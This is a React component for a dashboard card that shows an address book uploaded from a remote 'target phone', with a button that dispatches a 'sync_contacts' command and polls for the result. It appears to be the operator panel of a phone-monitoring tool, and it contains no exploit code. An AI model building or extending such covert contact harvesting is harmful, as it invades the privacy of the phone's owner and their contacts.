import { useEffect, useState, useMemo } from "react";
import { devicesApi } from "../api/devices";
import type { SavedContact, SavedContactsResponse } from "../api/types";

export default function SavedContactsCard({ deviceId }: { deviceId: string }) {
  const [data, setData] = useState<SavedContactsResponse>({
    contacts: [],
    total: 0,
    breakdown: { total: 0, sim: 0, google: 0, phone: 0 }
  });
  const [loading, setLoading] = useState(true);
  const [syncing, setSyncing] = useState(false);
  const [syncMessage, setSyncMessage] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [activeFilter, setActiveFilter] = useState<"all" | "google" | "sim" | "phone">("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const fetchContacts = async (silent = false) => {
    if (!silent) setLoading(true);
    try {
      const res = await devicesApi.contacts(deviceId);
      setData(res);
    } catch (err) {
      console.error("Failed to load saved contacts:", err);
    } finally {
      if (!silent) setLoading(false);
    }
  };

  useEffect(() => {
    fetchContacts();
    const interval = setInterval(() => {
      fetchContacts(true);
    }, 30000); // 30s background poll
    return () => clearInterval(interval);
  }, [deviceId]);

  const handleSyncNow = async () => {
    if (syncing) return;
    setSyncing(true);
    setSyncMessage("Dispatching sync command to device...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "sync_contacts");
      const cmdId = cmd?.id;

      if (cmdId) {
        // Poll for command completion (up to 20s)
        for (let i = 0; i < 15; i++) {
          await new Promise((r) => setTimeout(r, 1200));
          try {
            const check = await devicesApi.getCommand(deviceId, cmdId);
            if (check.status === "acked") {
              setSyncMessage("Contacts successfully updated from target phone!");
              await fetchContacts(true);
              break;
            } else if (check.status === "failed") {
              setSyncMessage("Device reported: " + (check.result?.error || "Sync failed"));
              break;
            } else {
              setSyncMessage(`Waiting for phone pickup (${i + 1}/15)...`);
            }
          } catch (_: unknown) {}
        }
      }
      await fetchContacts(true);
    } catch (err) {
      setSyncMessage("Failed to send command: " + (err as Error).message);
    } finally {
      setTimeout(() => {
        setSyncing(false);
        setSyncMessage(null);
      }, 3000);
    }
  };

  const handleCopyNumber = (id: string, number: string) => {
    navigator.clipboard.writeText(number);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  // Filter contacts by search query & category tab
  const filteredContacts = useMemo(() => {
    let list = data.contacts || [];

    // Filter by storage type tab
    if (activeFilter === "google") {
      list = list.filter(
        (c) =>
          c.storage_type.includes("@") ||
          c.account_type.toLowerCase().includes("google") ||
          c.storage_type.toLowerCase().includes("google")
      );
    } else if (activeFilter === "sim") {
      list = list.filter(
        (c) =>
          c.storage_type.toLowerCase().includes("sim") ||
          c.account_type.toLowerCase().includes("sim") ||
          c.account_name.toLowerCase().includes("sim")
      );
    } else if (activeFilter === "phone") {
      list = list.filter(
        (c) =>
          c.storage_type.toLowerCase().includes("phone") ||
          c.storage_type.toLowerCase().includes("device") ||
          (!c.account_type && !c.account_name)
      );
    }

    // Filter by search query
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase().trim();
      list = list.filter(
        (c) =>
          c.name.toLowerCase().includes(q) ||
          c.phone_number.toLowerCase().includes(q) ||
          c.storage_type.toLowerCase().includes(q) ||
          c.account_name.toLowerCase().includes(q)
      );
    }

    return list;
  }, [data.contacts, activeFilter, searchQuery]);

  // Storage badge helper with modern styling
  const renderStorageBadge = (contact: SavedContact) => {
    const st = contact.storage_type || "Phone Storage";
    const stLower = st.toLowerCase();
    const atLower = (contact.account_type || "").toLowerCase();

    // 1. Google / Email account
    if (st.includes("@") || atLower.includes("google") || stLower.includes("google")) {
      return (
        <span
          className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium bg-blue-50 text-blue-700 border border-blue-200/80 shadow-xs"
          title={`Google Account: ${contact.account_name || st}`}
        >
          <span className="text-xs">📧</span>
          <span className="font-semibold truncate max-w-[170px]">
            {contact.account_name && contact.account_name.includes("@")
              ? contact.account_name
              : st}
          </span>
        </span>
      );
    }

    // 2. SIM Card
    if (stLower.includes("sim") || atLower.includes("sim") || (contact.account_name || "").toLowerCase().includes("sim")) {
      const isSim2 = stLower.includes("2") || (contact.account_name || "").toLowerCase().includes("2");
      return (
        <span
          className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200 shadow-xs"
          title={`SIM Card: ${contact.account_name || st}`}
        >
          <span className="text-xs">📱</span>
          <span>{isSim2 ? "SIM 2" : "SIM"}</span>
        </span>
      );
    }

    // 3. Phone / Internal Device Memory
    if (stLower.includes("phone") || stLower.includes("device") || (!contact.account_type && !contact.account_name)) {
      return (
        <span
          className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium bg-amber-50 text-amber-800 border border-amber-200 shadow-xs"
          title="Stored in Phone Internal Storage"
        >
          <span className="text-xs">💾</span>
          <span>Phone Storage</span>
        </span>
      );
    }

    // 4. WhatsApp or other 3rd party
    if (stLower.includes("whatsapp")) {
      return (
        <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium bg-teal-50 text-teal-800 border border-teal-200 shadow-xs">
          <span className="text-xs">💬</span>
          <span>WhatsApp</span>
        </span>
      );
    }

    // 5. Fallback custom account
    return (
      <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-medium bg-gray-100 text-gray-700 border border-gray-200 shadow-xs">
        <span className="text-xs">📁</span>
        <span className="truncate max-w-[140px]">{st}</span>
      </span>
    );
  };

  // Avatar initials generator with deterministic pleasant colors
  const getAvatarColor = (name: string) => {
    const colors = [
      "bg-indigo-500",
      "bg-sky-500",
      "bg-emerald-500",
      "bg-purple-500",
      "bg-rose-500",
      "bg-amber-500",
      "bg-teal-500",
      "bg-violet-500",
    ];
    let hash = 0;
    for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
    const index = Math.abs(hash) % colors.length;
    return colors[index];
  };

  const getInitials = (name: string) => {
    if (!name) return "?";
    const parts = name.trim().split(/\s+/);
    if (parts.length >= 2) {
      return (parts[0][0] + parts[1][0]).toUpperCase();
    }
    return name.slice(0, 2).toUpperCase();
  };

  return (
    <div className="bg-white rounded-xl shadow-xs border border-gray-200 overflow-hidden">
      {/* Header */}
      <div className="p-5 border-b border-gray-100 bg-linear-to-r from-gray-50/60 to-white">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-linear-to-br from-indigo-500 to-sky-500 text-white flex items-center justify-center font-bold text-lg shadow-sm">
              📇
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-lg font-bold text-gray-900">Saved Contacts</h2>
                <span className="px-2 py-0.5 rounded-full text-xs font-semibold bg-indigo-50 text-indigo-700 border border-indigo-200">
                  {data.total} contacts
                </span>
              </div>
              <p className="text-xs text-gray-500 mt-0.5">
                Target device address book with storage location (SIM, Google Mail, Phone Memory)
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={handleSyncNow}
              disabled={syncing}
              className={`px-3.5 py-1.5 text-xs font-semibold rounded-lg border transition flex items-center gap-1.5 shadow-xs ${
                syncing
                  ? "bg-indigo-50 text-indigo-400 border-indigo-200 cursor-not-allowed"
                  : "bg-white text-indigo-600 border-indigo-300 hover:bg-indigo-50 hover:border-indigo-400"
              }`}
              title="Request the target device to read and upload all contacts immediately"
            >
              <span className={syncing ? "animate-spin" : ""}>🔄</span>
              <span>{syncing ? "Syncing with phone..." : "Sync Contacts Now"}</span>
            </button>
          </div>
        </div>

        {/* Sync message banner if any */}
        {syncMessage && (
          <div className="mt-3 text-xs px-3 py-1.5 rounded-md bg-indigo-50 border border-indigo-200 text-indigo-700 font-medium flex items-center gap-2 animate-pulse">
            <span>ℹ️</span>
            <span>{syncMessage}</span>
          </div>
        )}

        {/* Filter Pills & Search Bar */}
        <div className="mt-4 flex flex-col md:flex-row md:items-center justify-between gap-3">
          {/* Category Filter Pills */}
          <div className="flex items-center gap-1.5 overflow-x-auto pb-1 md:pb-0 scrollbar-none">
            <button
              onClick={() => setActiveFilter("all")}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 whitespace-nowrap ${
                activeFilter === "all"
                  ? "bg-indigo-600 text-white shadow-xs"
                  : "bg-gray-100 text-gray-600 hover:bg-gray-200/70"
              }`}
            >
              <span>All Contacts</span>
              <span className={`text-[10px] px-1.5 py-0.2 rounded-full ${
                activeFilter === "all" ? "bg-white/20 text-white" : "bg-gray-200 text-gray-700"
              }`}>
                {data.breakdown.total}
              </span>
            </button>

            <button
              onClick={() => setActiveFilter("google")}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 whitespace-nowrap ${
                activeFilter === "google"
                  ? "bg-blue-600 text-white shadow-xs"
                  : "bg-blue-50/80 text-blue-700 hover:bg-blue-100/70 border border-blue-200/60"
              }`}
            >
              <span>📧 Google / Mail</span>
              <span className={`text-[10px] px-1.5 py-0.2 rounded-full ${
                activeFilter === "google" ? "bg-white/20 text-white" : "bg-blue-200/70 text-blue-800"
              }`}>
                {data.breakdown.google}
              </span>
            </button>

            <button
              onClick={() => setActiveFilter("sim")}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 whitespace-nowrap ${
                activeFilter === "sim"
                  ? "bg-emerald-600 text-white shadow-xs"
                  : "bg-emerald-50/80 text-emerald-700 hover:bg-emerald-100/70 border border-emerald-200/60"
              }`}
            >
              <span>📱 SIM Card</span>
              <span className={`text-[10px] px-1.5 py-0.2 rounded-full ${
                activeFilter === "sim" ? "bg-white/20 text-white" : "bg-emerald-200/70 text-emerald-800"
              }`}>
                {data.breakdown.sim}
              </span>
            </button>

            <button
              onClick={() => setActiveFilter("phone")}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 whitespace-nowrap ${
                activeFilter === "phone"
                  ? "bg-amber-600 text-white shadow-xs"
                  : "bg-amber-50/80 text-amber-800 hover:bg-amber-100/70 border border-amber-200/60"
              }`}
            >
              <span>💾 Phone Storage</span>
              <span className={`text-[10px] px-1.5 py-0.2 rounded-full ${
                activeFilter === "phone" ? "bg-white/20 text-white" : "bg-amber-200/70 text-amber-900"
              }`}>
                {data.breakdown.phone}
              </span>
            </button>
          </div>

          {/* Search Input */}
          <div className="relative min-w-[220px] md:w-64">
            <span className="absolute inset-y-0 left-0 pl-2.5 flex items-center pointer-events-none text-gray-400 text-sm">
              🔍
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search name, phone, email..."
              className="w-full pl-8 pr-3 py-1.5 text-xs bg-white border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition shadow-2xs"
            />
            {searchQuery && (
              <button
                onClick={() => setSearchQuery("")}
                className="absolute inset-y-0 right-0 pr-2.5 flex items-center text-gray-400 hover:text-gray-600 text-xs"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Contacts List / Table */}
      <div className="overflow-x-auto max-h-96 overflow-y-auto">
        {loading ? (
          <div className="p-12 text-center text-gray-500 text-xs">
            <div className="inline-block animate-spin text-2xl mb-2">⏳</div>
            <p>Loading saved contacts...</p>
          </div>
        ) : filteredContacts.length === 0 ? (
          <div className="p-12 text-center text-gray-500 text-xs">
            <div className="text-3xl mb-2">📇</div>
            <p className="font-semibold text-gray-700 text-sm">No contacts found</p>
            <p className="mt-1 text-gray-500">
              {searchQuery
                ? `No contacts matched "${searchQuery}" in this filter.`
                : "No saved contacts uploaded from this device yet."}
            </p>
            {!searchQuery && (
              <button
                onClick={handleSyncNow}
                disabled={syncing}
                className="mt-3.5 inline-flex items-center gap-1.5 px-3 py-1.5 bg-indigo-600 text-white rounded-lg text-xs font-medium hover:bg-indigo-700 transition"
              >
                <span>🔄</span>
                <span>Click here to Sync from Phone Now</span>
              </button>
            )}
          </div>
        ) : (
          <table className="w-full text-left text-xs border-collapse">
            <thead className="bg-gray-50/80 text-gray-500 font-semibold border-b border-gray-200 sticky top-0 z-10 backdrop-blur-xs">
              <tr>
                <th className="py-2.5 px-4 w-12 text-center">#</th>
                <th className="py-2.5 px-4">Contact Name</th>
                <th className="py-2.5 px-4">Phone Number</th>
                <th className="py-2.5 px-4">Type</th>
                <th className="py-2.5 px-4">Saved Location (Storage)</th>
                <th className="py-2.5 px-4 text-right">Last Synced</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100">
              {filteredContacts.map((contact, idx) => (
                <tr
                  key={contact.id || idx}
                  className="hover:bg-indigo-50/30 transition group"
                >
                  {/* Row index */}
                  <td className="py-3 px-4 text-center text-[11px] text-gray-400">
                    {idx + 1}
                  </td>

                  {/* Name + Avatar */}
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2.5">
                      <div
                        className={`w-7 h-7 rounded-full text-white flex items-center justify-center font-bold text-[11px] shrink-0 shadow-xs ${getAvatarColor(
                          contact.name
                        )}`}
                      >
                        {getInitials(contact.name)}
                      </div>
                      <span className="font-semibold text-gray-900 group-hover:text-indigo-600 transition">
                        {contact.name}
                      </span>
                    </div>
                  </td>

                  {/* Phone Number + Copy Button */}
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-gray-800 font-medium">
                        {contact.phone_number}
                      </span>
                      <button
                        onClick={() => handleCopyNumber(contact.id, contact.phone_number)}
                        className="opacity-0 group-hover:opacity-100 p-1 hover:bg-gray-100 rounded text-[11px] text-gray-500 transition"
                        title="Copy phone number"
                      >
                        {copiedId === contact.id ? "✓ Copied" : "📋"}
                      </button>
                    </div>
                  </td>

                  {/* Phone Type (Mobile, Home, Work, etc.) */}
                  <td className="py-3 px-4">
                    <span className="px-2 py-0.5 rounded text-[10px] font-medium bg-gray-100 text-gray-600">
                      {contact.phone_type || "Mobile"}
                    </span>
                  </td>

                  {/* Storage Location Badge (SIM / Email / Phone Storage) */}
                  <td className="py-3 px-4">
                    {renderStorageBadge(contact)}
                  </td>

                  {/* Last Synced */}
                  <td className="py-3 px-4 text-right text-[11px] text-gray-400 whitespace-nowrap">
                    {contact.synced_at ? new Date(contact.synced_at).toLocaleDateString() : "Recently"}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>

      {/* Footer Summary */}
      {filteredContacts.length > 0 && (
        <div className="p-3 border-t border-gray-100 bg-gray-50/50 flex flex-col sm:flex-row items-center justify-between text-xs text-gray-500 gap-2">
          <span>
            Showing <strong className="text-gray-700">{filteredContacts.length}</strong> of{" "}
            <strong className="text-gray-700">{data.total}</strong> total contacts
          </span>
          <div className="flex items-center gap-3 text-[11px]">
            <span className="flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-blue-500"></span>
              Google/Mail: <strong>{data.breakdown.google}</strong>
            </span>
            <span className="flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-emerald-500"></span>
              SIM: <strong>{data.breakdown.sim}</strong>
            </span>
            <span className="flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-amber-500"></span>
              Phone: <strong>{data.breakdown.phone}</strong>
            </span>
          </div>
        </div>
      )}
    </div>
  );
}
